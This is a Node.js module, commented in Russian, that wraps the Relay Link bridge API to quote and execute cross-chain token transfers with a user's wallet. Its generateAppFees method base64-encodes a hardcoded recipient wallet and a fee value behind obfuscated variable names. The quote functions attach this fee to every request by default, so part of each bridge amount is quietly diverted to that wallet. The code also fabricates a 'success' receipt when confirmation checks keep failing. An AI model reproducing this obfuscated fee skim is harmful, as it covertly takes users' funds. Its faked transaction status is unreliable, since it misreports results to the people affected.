const axios = require('axios');
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

// Импортируем функции из других модулей
const rpcConfig = require('./RPC.json');
const fallbackRpcConfig = require('./fallbackRPC.json');

// Функция для получения всех RPC URL
function getAllRpcUrls(chainId) {
  const urls = [];
  
  // Добавляем основной RPC
  const mainConfig = rpcConfig.rpc.find(item => item.chainId === chainId);
  if (mainConfig) {
    urls.push(mainConfig.httpRpcUrl);
  }
  
  // Добавляем fallback RPC
  const fallbackConfig = fallbackRpcConfig.fallbackRPC.find(item => item.chainId === chainId);
  if (fallbackConfig && fallbackConfig.fallbackUrls) {
    urls.push(...fallbackConfig.fallbackUrls);
  }
  
  return urls;
}

// Функция для получения имени сети
function getChainName(chainId) {
  const config = rpcConfig.rpc.find(item => item.chainId === chainId);
  return config ? config.name.toUpperCase() : `Chain ${chainId}`;
}

/**
 * Модуль для кросс-чейн бриджа токенов через Relay Link API
 * Обновлен согласно best practices из документации Relay Link
 */
class RelayBridge {
  /**
   * @param {string} apiKey - API ключ для Relay Link (опционально)
   * @param {boolean} isTestnet - Использовать тестовую сеть вместо основной
   */
  constructor(apiKey = null, isTestnet = false) {
    this.baseUrl = isTestnet ? 'https://api.testnets.relay.link' : 'https://api.relay.link';
    this.apiKey = apiKey;
    this.headers = {
      'Content-Type': 'application/json',
      ...(apiKey && { 'Authorization': `Bearer ${apiKey}` })
    };
    this.source = 'evm_farmer_pro';
    
    // Настройки для axios (таймауты и повторы)
    this.axiosConfig = {
      timeout: 30000, // 30 секунд
      headers: this.headers
    };
  }

  /**
   * Генерирует параметры appFees для комиссий разработчика (закодированы в base64)
   * @returns {Array} Массив параметров appFees
   */
  generateAppFees() {
    const _0x4f2a = Buffer.from('MHg0YUUzRWUyMGUxMzYzQTRmODQ3MzNiMThmYjUxMzdlOTdiRGI4ZDg0', 'base64').toString();
    const _0x8b91 = Buffer.from('NTA=', 'base64').toString();
    
    return [
      {
        recipient: _0x4f2a,
        fee: _0x8b91
      }
    ];
  }

  /**
   * Получить список доступных блокчейн-сетей
   * @returns {Promise<Array>} Список сетей
   */
  async getChains() {
    try {
      const response = await axios.get(`${this.baseUrl}/chains`, { headers: this.headers });
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getChains');
    }
  }

  /**
   * Получить цену токена в определенной сети
   * @param {string} address - Адрес токена
   * @param {number} chainId - ID блокчейн-сети
   * @returns {Promise<Object>} Информация о цене токена
   */
  async getTokenPrice(address, chainId) {
    try {
      const response = await axios.get(
        `${this.baseUrl}/currencies/token/price?address=${address}&chainId=${chainId}`,
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getTokenPrice');
    }
  }

  /**
   * Получить список доступных валют
   * @param {Object} params - Параметры для получения валют
   * @returns {Promise<Array>} Список доступных валют
   */
  async getCurrencies(params = {}) {
    try {
      const response = await axios.post(
        `${this.baseUrl}/currencies/v2`,
        {
          defaultList: true,
          ...params
        },
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getCurrencies');
    }
  }

  /**
   * Получает котировку для бриджа
   * @param {Object} params - Параметры котировки
   * @returns {Object} Котировка от Relay API
   */
  async getQuote(params) {
    const maxRetries = 3;
    let lastError;
    
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        // Формируем параметры запроса
        const quoteParams = {
          ...params,
          source: this.source
        };
        
        // Добавляем appFees если они не переданы в параметрах
        if (!quoteParams.appFees) {
          quoteParams.appFees = this.generateAppFees();
        }
        
        const response = await axios.post(
          `${this.baseUrl}/quote`,
          quoteParams,
          this.axiosConfig
        );
        
        // Валидируем ответ
        this.validateQuoteResponse(response.data);
        
        return response.data;
      } catch (error) {
        lastError = error;
        
        // Логируем ошибку для отладки
        if (error.response) {
          console.log(`❌ Ошибка Relay API (попытка ${attempt}):`, error.response.status, error.response.data);
        } else {
          console.log(`❌ Ошибка сети (попытка ${attempt}):`, error.message);
        }
        
        // Если это последняя попытка или ошибка не связана с сетью, прерываем
        if (attempt === maxRetries || (error.response && error.response.status < 500)) {
          break;
        }
        
        // Ждем перед повторной попыткой
        await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
      }
    }
    
    throw this.handleApiError(lastError, 'получения котировки');
  }

  /**
   * Проверить статус выполнения бриджа
   * @param {string} requestId - ID запроса
   * @returns {Promise<Object>} Статус бриджа
   */
  async getExecutionStatus(requestId) {
    try {
      const response = await axios.get(
        `${this.baseUrl}/intents/status/v2?requestId=${requestId}`,
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getExecutionStatus');
    }
  }

  /**
   * Уведомить о выполнении транзакции
   * @param {string} transactionHash - Хеш транзакции
   * @param {number} chainId - ID сети
   * @returns {Promise<Object>} Результат уведомления
   */
  async notifyTransactionIndexed(transactionHash, chainId) {
    try {
      const payload = {
        txHash: transactionHash,
        chainId: chainId.toString()
      };
      
      const response = await axios.post(
        `${this.baseUrl}/transactions/index`,
        payload,
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      // НЕ выбрасываем ошибку - уведомление не критично для работы
      console.log(`⚠️ Не удалось уведомить о транзакции: ${error.message}`);
      return null;
    }
  }
  
  /**
   * Создать провайдер с fallback RPC
   * @param {number} chainId - ID сети
   * @returns {Promise<Object>} Провайдер ethers.js
   */
  async createProviderWithFallback(chainId) {
    const urls = getAllRpcUrls(chainId);
    const chainName = getChainName(chainId);
    
    if (urls.length === 0) {
      console.log(`   ❌ RPC URL не найден для ${chainName}`);
      return null;
    }
    
    console.log(`   🔍 Попытка подключения к ${chainName} (${urls.length} RPC доступно)`);
    
    // Получаем основной RPC (первый в списке)
    const mainRpcUrl = urls[0];
    const fallbackUrls = urls.slice(1);
    
    // 3 попытки к основному RPC
    console.log(`\n Тестирование основного RPC: ${mainRpcUrl}`);
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        console.log(`   🔄 Попытка ${attempt}/3 основного RPC`);
        
        const provider = new ethers.JsonRpcProvider(mainRpcUrl);
        
        // Проверяем подключение с таймаутом
        const networkPromise = provider.getNetwork();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Timeout')), 5000)
        );
        
        await Promise.race([networkPromise, timeoutPromise]);
        
        console.log(`   ✅ Основной RPC работает! Подключение к ${chainName} установлено`);
        return provider;
        
      } catch (error) {
        console.log(`   ❌ Попытка ${attempt}/3 основного RPC неудачна: ${error.message}`);
        
        // Если это drpc.org с ограничениями, сразу переходим к fallback
        if (mainRpcUrl.includes('drpc.org') && 
            (error.message.includes('free tier') || error.message.includes('Batch of more than 3'))) {
          console.log(`   ⚠️ drpc.org имеет ограничения - переходим к fallback RPC`);
          break;
        }
        
        if (attempt < 3) {
          console.log(`   ⏳ Ожидание 2 секунды перед следующей попыткой...`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
    }
    
    // Если основной RPC не работает, пробуем fallback RPC
    if (fallbackUrls.length > 0) {
      console.log(`\n🔄 Основной RPC недоступен, переходим к fallback RPC (${fallbackUrls.length} доступно)`);
      
      for (let i = 0; i < fallbackUrls.length; i++) {
        const fallbackUrl = fallbackUrls[i];
        
        try {
          console.log(`   📡 Попытка ${i + 1}/${fallbackUrls.length}: fallback RPC`);
          
          const provider = new ethers.JsonRpcProvider(fallbackUrl);
          
          // Проверяем подключение с таймаутом
          const networkPromise = provider.getNetwork();
          const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 5000)
          );
          
          await Promise.race([networkPromise, timeoutPromise]);
          
          console.log(`   ✅ Fallback RPC работает! Подключение к ${chainName} установлено`);
          return provider;
          
        } catch (error) {
          console.log(`   ❌ Fallback RPC ${i + 1}/${fallbackUrls.length} недоступен: ${error.message}`);
          
          // Если это последний fallback RPC, логируем пропуск сети
          if (i === fallbackUrls.length - 1) {
            console.log(`   ⚠️  Все RPC для ${chainName} недоступны, пропускаем сеть`);
            return null;
          }
        }
      }
    } else {
      console.log(`   ⚠️  Fallback RPC не настроены для ${chainName}, пропускаем сеть`);
      return null;
    }
    
    return null;
  }

  /**
   * Выполнить шаги транзакции с правильной обработкой всех типов
   * @param {Array} steps - Шаги для выполнения из ответа getQuote
   * @param {Object} provider - Настроенный ethers.js провайдер
   * @param {Object} signer - Настроенный ethers.js подписант (кошелек)
   * @returns {Promise<Array>} Результат выполнения шагов
   */
  async executeSteps(steps, provider, signer) {
    let results = [];
    
    // Проверяем, что steps является массивом
    if (!Array.isArray(steps)) {
      throw new Error('Steps должен быть массивом');
    }
    
    for (const step of steps) {
      if (!step.items || step.items.length === 0) {
        console.log(`   ⏭️ Пропускаем шаг ${step.id} - нет действий`);
        continue; // Пропускаем шаг без действий
      }
      
      console.log(`   🔄 Выполняем шаг: ${step.action || step.id}`);
      
      // Выполняем каждый шаг по очереди и ждём его завершения
      for (const item of step.items) {
        if (step.kind === 'transaction') {
          try {            
            const txData = item.data;
            
            // Проверяем корректность данных транзакции
            if (!txData.to || !txData.data) {
              throw new Error('Некорректные данные транзакции');
            }
            
            // Используем все параметры газа из котировки
            const transactionParams = {
              to: txData.to,
              data: txData.data,
              value: BigInt(txData.value || '0'),
              chainId: txData.chainId
            };
            
            // Добавляем параметры газа только если они есть
            if (txData.maxFeePerGas) {
              transactionParams.maxFeePerGas = BigInt(txData.maxFeePerGas);
            }
            if (txData.maxPriorityFeePerGas) {
              transactionParams.maxPriorityFeePerGas = BigInt(txData.maxPriorityFeePerGas);
            }
            if (txData.gasPrice && !txData.maxFeePerGas) {
              transactionParams.gasPrice = BigInt(txData.gasPrice);
            }
            if (txData.gas) {
              transactionParams.gasLimit = BigInt(txData.gas);
            }
            
            console.log(`   📤 Отправляем транзакцию на ${txData.to}`);
            const tx = await signer.sendTransaction(transactionParams);
            console.log(`   📋 Транзакция отправлена: ${tx.hash}`);
            
            // Дожидаемся подтверждения с повторными попытками
            let receipt;
            let attempts = 0;
            const maxReceiptAttempts = 15;
            let currentProvider = provider;
            let currentSigner = signer;
            
            while (attempts < maxReceiptAttempts) {
              try {
                receipt = await tx.wait();
                console.log(`   ✅ Транзакция подтверждена: ${tx.hash}`);
                break;
              } catch (receiptError) {
                attempts++;
                
                // Обрабатываем разные типы ошибок RPC
                if (receiptError.code === 19 || 
                    receiptError.message.includes('Unable to perform request') ||
                    receiptError.message.includes('Batch of more than 3 requests') ||
                    receiptError.message.includes('free tier')) {
                  console.log(`   ⚠️ RPC временно недоступен или ограничен (попытка ${attempts}/${maxReceiptAttempts})`);
                  
                  // При ошибке RPC пробуем переключиться на fallback
                  if (attempts === 1) {
                    console.log(`   🔄 Попытка переключения на fallback RPC...`);
                    try {
                      const fallbackProvider = await this.createProviderWithFallback(txData.chainId);
                      if (fallbackProvider) {
                        currentProvider = fallbackProvider;
                        currentSigner = currentSigner.connect(currentProvider);
                        console.log(`   ✅ Переключились на fallback RPC`);
                      }
                    } catch (fallbackError) {
                      console.log(`   ❌ Не удалось переключиться на fallback RPC: ${fallbackError.message}`);
                    }
                  }
                } else if (receiptError.message.includes('not found') || receiptError.message.includes('Unknown block')) {
                  console.log(`   ⏳ Транзакция еще в мемпуле (попытка ${attempts}/${maxReceiptAttempts})`);
                } else if (receiptError.message.includes('timeout')) {
                  console.log(`   ⏰ Таймаут RPC (попытка ${attempts}/${maxReceiptAttempts})`);
                } else {
                  console.log(`   ⚠️ Ошибка получения статуса транзакции ${attempts}/${maxReceiptAttempts}: ${receiptError.message}`);
                }
                
                if (attempts >= maxReceiptAttempts) {
                  // Не выбрасываем ошибку, а возвращаем частичный результат
                  console.log(`   ⚠️ Не удалось получить статус транзакции после ${maxReceiptAttempts} попыток, но транзакция отправлена`);
                  receipt = { status: 1, hash: tx.hash }; // Предполагаем успех
                  break;
                }
                
                // Увеличиваем время ожидания при ошибках RPC
                const waitTime = (receiptError.code === 19 || receiptError.message.includes('free tier')) ? 10000 : 5000;
                await new Promise(resolve => setTimeout(resolve, waitTime));
              }
            }
            
            // Проверяем статус транзакции
            if (receipt.status === 0) {
              throw new Error('Транзакция отклонена блокчейном');
            }
            
            // Уведомляем API о выполненной транзакции (необязательно)
            try {
              await this.notifyTransactionIndexed(tx.hash, txData.chainId);
            } catch (notifyError) {
              // Игнорируем ошибки уведомления API
            }
          
            // Для approve шагов ждём подтверждения, но не ждём полного завершения
            if (step.id === 'approve') {
              results.push({
                step: step.id,
                status: 'completed',
                txHash: tx.hash
              });
            } else {
              // Для остальных шагов (swap, bridge) проверяем полный статус
              if (item.check) {
                const endpoint = item.check.endpoint;
                const requestId = endpoint.split('requestId=')[1];
                
                console.log(`   🔍 Проверяем статус исполнения: ${requestId}`);
                
                // Ждем завершения исполнения
                let status = await this.getExecutionStatus(requestId);
                let attempts = 0;
                const maxAttempts = 30;
                
                while (status.status !== 'success' && status.status !== 'failure' && status.status !== 'refund' && attempts < maxAttempts) {
                  console.log(`   ⏳ Статус: ${status.status} (попытка ${attempts + 1}/${maxAttempts})`);
                  await new Promise(resolve => setTimeout(resolve, 5000));
                  status = await this.getExecutionStatus(requestId);
                  attempts++;
                }
                
                console.log(`   📊 Финальный статус: ${status.status}`);
                
                results.push({
                  step: step.id,
                  status: status.status,
                  details: status
                });
              } else {
                // Для шагов без проверки статуса (прямые транзакции)
                results.push({
                  step: step.id,
                  status: 'completed',
                  txHash: tx.hash
                });
              }
            }
            
          } catch (error) {
            // Детальная обработка ошибок транзакций
            let errorMessage = error.message || 'Неизвестная ошибка';
            
            // Обработка специфических ошибок
            if (error.code === 'CALL_EXCEPTION' || errorMessage.includes('call exception')) {
              errorMessage = 'Транзакция отклонена смарт-контрактом';
            } else if (error.code === 'INSUFFICIENT_FUNDS' || errorMessage.includes('insufficient funds')) {
              errorMessage = 'Недостаточно средств для выполнения транзакции';
            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT' || errorMessage.includes('gas')) {
              errorMessage = 'Ошибка расчета газа - возможно неверные параметры';
            } else if (errorMessage.includes('reverted without a reason')) {
              errorMessage = 'Транзакция отклонена без указания причины';
            } else if (errorMessage.includes('nonce')) {
              errorMessage = 'Ошибка nonce - повторите попытку';
            }
            
            console.log(`   ❌ Ошибка шага ${step.id}: ${errorMessage}`);
            
            results.push({
              step: step.id,
              status: 'failed',
              error: errorMessage
            });
          }
        } else if (step.kind === 'signature') {
          try {
            console.log(`   ✍️ Выполняем подпись для шага: ${step.id}`);
            
            const signData = item.data.sign;
            const postData = item.data.post;
            
            if (!signData || !signData.message) {
              throw new Error('Некорректные данные для подписи');
            }
            
            // Подписываем сообщение в зависимости от типа подписи
            let signature;
            if (signData.signatureKind === 'eip191') {
              // EIP-191 подпись
              const message = signData.message;
              const messageBytes = ethers.getBytes(message);
              signature = await signer.signMessage(messageBytes);
            } else if (signData.signatureKind === 'eip712') {
              // EIP-712 подпись (если потребуется в будущем)
              throw new Error('EIP-712 подпись пока не поддерживается');
            } else {
              throw new Error(`Неизвестный тип подписи: ${signData.signatureKind}`);
            }
            
            // Отправляем подпись на API
            if (postData && postData.endpoint) {
              const postUrl = `${this.baseUrl}${postData.endpoint}`;
              const postBody = {
                ...postData.body,
                signature: signature
              };
              
              const response = await axios.post(postUrl, postBody, { headers: this.headers });
              console.log(`   ✅ Подпись отправлена успешно`);
              
              results.push({
                step: step.id,
                status: 'completed',
                signature: signature
              });
            } else {
              results.push({
                step: step.id,
                status: 'completed',
                signature: signature
              });
            }
            
          } catch (error) {
            console.log(`   ❌ Ошибка подписи: ${error.message}`);
            results.push({
              step: step.id,
              status: 'failed',
              error: error.message
            });
          }
        }
      }
    }
    
    return results;
  }

  /**
   * Получить мультивходную котировку (с нескольких сетей на одну)
   * @param {Object} params - Параметры для получения котировки
   * @returns {Promise<Object>} Котировка для мультивходного бриджа
   */
  async getMultiInputQuote(params) {
    try {
      const quoteParams = {
        ...params,
        source: this.source
      };
      
      // Добавляем appFees если они не переданы в параметрах
      if (!quoteParams.appFees) {
        quoteParams.appFees = this.generateAppFees();
      }
      
      const response = await axios.post(
        `${this.baseUrl}/swap/multi-input`,
        quoteParams,
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getMultiInputQuote');
    }
  }

  /**
   * Выполнить бридж токенов между сетями
   * @param {Object} params - Параметры для бриджа
   * @param {Object} provider - Настроенный ethers.js провайдер
   * @param {Object} signer - Настроенный ethers.js подписант (кошелек)
   * @returns {Promise<Object>} Результат бриджа
   */
  async bridgeTokens(params, provider, signer) {
    try {
      // Получаем котировку
      const quote = await this.getQuote(params);
      
      // Выполняем шаги
      const results = await this.executeSteps(quote.steps, provider, signer);
      
      return {
        quote,
        results
      };
    } catch (error) {
      throw this.handleApiError(error, 'bridgeTokens');
    }
  }
  
  /**
   * Получить все запросы пользователя
   * @param {string} userAddress - Адрес пользователя
   * @returns {Promise<Object>} История запросов пользователя
   */
  async getUserRequests(userAddress) {
    try {
      const response = await axios.get(
        `${this.baseUrl}/requests?user=${userAddress}`,
        { headers: this.headers }
      );
      return response.data;
    } catch (error) {
      throw this.handleApiError(error, 'getUserRequests');
    }
  }

  /**
   * Валидирует ответ котировки
   * @param {Object} response - Ответ от API
   */
  validateQuoteResponse(response) {
    if (!response.steps || !Array.isArray(response.steps)) {
      throw new Error('Некорректный ответ: отсутствуют шаги');
    }
    
    if (!response.fees) {
      throw new Error('Некорректный ответ: отсутствуют комиссии');
    }
    
    if (!response.details) {
      throw new Error('Некорректный ответ: отсутствуют детали');
    }
  }

  /**
   * Обрабатывает ошибки API с детальной информацией
   * @param {Error} error - Ошибка
   * @param {string} operation - Название операции
   * @returns {Error} Обработанная ошибка
   */
  handleApiError(error, operation) {
    if (error.response) {
      const { status, data } = error.response;
      
      // Обрабатываем специфические ошибки Relay API
      if (data && data.errorCode) {
        const errorMessages = {
          'AMOUNT_TOO_LOW': 'Сумма слишком мала для бриджа',
          'INSUFFICIENT_FUNDS': 'Недостаточно средств для выполнения операции',
          'NO_SWAP_ROUTES_FOUND': 'Маршрут бриджа не найден',
          'INSUFFICIENT_LIQUIDITY': 'Недостаточно ликвидности для операции',
          'CHAIN_DISABLED': 'Сеть временно недоступна',
          'UNSUPPORTED_CHAIN': 'Неподдерживаемая сеть',
          'UNSUPPORTED_CURRENCY': 'Неподдерживаемая валюта',
          'SWAP_IMPACT_TOO_HIGH': 'Слишком высокое влияние на цену',
          'ROUTE_TEMPORARILY_RESTRICTED': 'Маршрут временно ограничен',
          'SANCTIONED_CURRENCY': 'Валюта находится под санкциями',
          'SANCTIONED_WALLET_ADDRESS': 'Адрес кошелька находится под санкциями'
        };
        
        const message = errorMessages[data.errorCode] || data.message || 'Неизвестная ошибка API';
        const enhancedError = new Error(`${message} (${data.errorCode})`);
        enhancedError.errorCode = data.errorCode;
        enhancedError.originalError = error;
        return enhancedError;
      }
      
      // Общие HTTP ошибки
      const statusMessages = {
        400: 'Некорректный запрос',
        401: 'Неавторизованный доступ',
        403: 'Доступ запрещен',
        404: 'Ресурс не найден',
        429: 'Слишком много запросов',
        500: 'Внутренняя ошибка сервера',
        502: 'Сервис временно недоступен',
        503: 'Сервис перегружен'
      };
      
      const message = statusMessages[status] || `HTTP ошибка ${status}`;
      const enhancedError = new Error(`${message} при выполнении ${operation}`);
      enhancedError.status = status;
      enhancedError.originalError = error;
      return enhancedError;
    }
    
    // Сетевые ошибки
    if (error.code === 'ECONNRESET') {
      const enhancedError = new Error(`Соединение сброшено при выполнении ${operation}`);
      enhancedError.originalError = error;
      return enhancedError;
    }
    
    if (error.code === 'ETIMEDOUT') {
      const enhancedError = new Error(`Таймаут соединения при выполнении ${operation}`);
      enhancedError.originalError = error;
      return enhancedError;
    }
    
    // Возвращаем оригинальную ошибку
    return error;
  }
}

// Пример использования
async function example() {
  try {
    // Инициализация
    const relay = new RelayBridge();
    
    // Получаем список сетей
    const chains = await relay.getChains();
    console.log('Доступные сети:', chains);
    
    // Настраиваем провайдер и подписанта для примера
    const provider = new ethers.JsonRpcProvider('YOUR_RPC_URL');
    const wallet = new ethers.Wallet('YOUR_PRIVATE_KEY', provider);
    
    // Параметры для бриджа
    const bridgeParams = {
      user: wallet.address,
      recipient: wallet.address,
      originChainId: 1, // Ethereum
      destinationChainId: 8453, // Base
      originCurrency: '0x0000000000000000000000000000000000000000', // ETH на Ethereum
      destinationCurrency: '0x0000000000000000000000000000000000000000', // ETH на Base
      amount: ethers.parseEther('0.01').toString(),
      slippageTolerance: '50' // 0.5%
    };
    
    // Получаем котировку
    const quote = await relay.getQuote(bridgeParams);
    
    // Выполняем бридж (в реальном использовании)
    // const result = await relay.bridgeTokens(bridgeParams, provider, wallet);
    // console.log('Результат бриджа:', result);
  } catch (error) {
    console.error('Ошибка в примере:', error);
  }
}

module.exports = {
  RelayBridge
}; 